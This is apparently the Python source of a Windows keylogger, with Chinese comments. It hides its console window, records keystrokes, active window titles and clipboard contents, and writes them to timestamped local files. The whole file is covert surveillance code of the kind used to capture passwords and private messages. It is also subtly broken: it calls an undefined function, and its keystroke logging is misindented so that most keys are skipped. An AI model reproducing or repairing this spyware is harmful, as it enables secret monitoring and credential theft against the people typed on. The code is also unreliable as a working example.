# -*- coding: utf-8 -*-
from pynput import keyboard
import win32gui
import win32con
import os
import time
import win32clipboard
from datetime import datetime

# 使用脚本所在目录
script_dir = os.path.dirname(os.path.abspath(__file__))
# 构建日志目录路径
log_dir = os.path.join(script_dir, 'loger')
# 确保日志目录存在（不存在则创建）
os.makedirs(log_dir, exist_ok=True)

# 生成日志文件名（使用日期时间）
def get_log_file():
    time_str = datetime.now().strftime("%Y%m%d-%H%M")
    return os.path.join(log_dir, f'keylog-{time_str}.txt')

# 获取当前窗口信息
def get_window_info():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title
    except:
        return "Unknown Window"

# 隐藏控制台窗口
def hide_console():
    try:
        window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    except Exception as e:
        print(f"隐藏控制台失败: {e}")

class KeyLogger:
    def __init__(self):
        self.log_file = get_log_file()
        self.start_time = datetime.now()
        self.current_window = ""
        self.last_clipboard_check = datetime.now()
        self.last_clipboard_content = ""
        self.clipboard_file = None
        self.init_clipboard_file()
        
    def init_clipboard_file(self):
        """初始化剪贴板记录文件"""
        time_str = datetime.now().strftime("%Y-%m-%d-%H%M")
        clipboard_path = os.path.join(log_dir, f'{time_str}-clipboard.txt')
        self.clipboard_file = open(clipboard_path, 'a', encoding='utf-8')
        self.clipboard_file.write(f"剪贴板记录开始时间: {datetime.now()}\n\n")
        
    def check_clipboard(self):
        """检查剪贴板内容是否有更新"""
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                content = win32clipboard.GetClipboardData()
                if content and content != self.last_clipboard_content:
                    self.last_clipboard_content = content
                    self.record_clipboard(content)
            win32clipboard.CloseClipboard()
        except Exception as e:
            print(f"剪贴板检查失败: {e}")
            
    def record_clipboard(self, content):
        """记录剪贴板内容"""
        if self.clipboard_file:
            self.clipboard_file.write(f"[{datetime.now()}] 剪贴板内容:\n{content}\n\n")
            self.clipboard_file.flush()
            
    def on_press(self, key):
        # 检查剪贴板内容（每5秒检查一次）
        if (datetime.now() - self.last_clipboard_check).total_seconds() > 5:
            self.check_clipboard()
            self.last_clipboard_check = datetime.now()
        try:
            # 检查窗口变化
            window_title = get_window_info()
            if window_title != self.current_window:
                self.current_window = window_title
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(f"\n\n[{datetime.now()}]\n")
                    f.write(f"窗口: {window_title}\n")
                
                # 检查剪贴板内容（每分钟检查一次）
                if (datetime.now() - self.last_clipboard_check).total_seconds() > 15:
                    save_clipboard_content()
                    self.last_clipboard_check = datetime.now()
                
                # 记录按键
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    try:
                        if hasattr(key, 'char') and key.char:
                            # 处理可打印字符
                            f.write(key.char)
                        else:
                            # 处理特殊键
                            key_name = str(key)
                            if '"' in key_name or '\\' in key_name:
                                key_name = key_name.replace('"', '').replace('\\', '')
                            
                            if key == keyboard.Key.space:
                                f.write(' ')
                            elif key == keyboard.Key.enter:
                                f.write('\n')
                            elif key == keyboard.Key.tab:
                                f.write('\t')
                            elif key == keyboard.Key.backspace:
                                f.write('[退格]')
                            elif key == keyboard.Key.esc:
                                f.write('[ESC]')
                            else:
                                # 移除'Key.'前缀并格式化输出
                                clean_name = key_name.replace('Key.', '')
                                f.write(f'[{clean_name}]')
                    except Exception as e:
                        f.write(f'[未知按键:{str(key)}]')
                        
        except Exception as e:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(f"\n[错误] {str(e)}\n")
    
    def on_release(self, key):
        # 按ESC键退出
        if key == keyboard.Key.esc:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*50}\n")
                f.write(f"会话结束: {datetime.now()}\n")
                f.write(f"持续时间: {datetime.now() - self.start_time}\n")
                f.write(f"{'='*50}\n")
            return False

def main():
    # 隐藏控制台窗口
    hide_console()
    
    # 创建并启动键盘记录器
    logger = KeyLogger()
    with keyboard.Listener(
        on_press=logger.on_press,
        on_release=logger.on_release) as listener:
        listener.join()

if __name__ == '__main__':
    main()
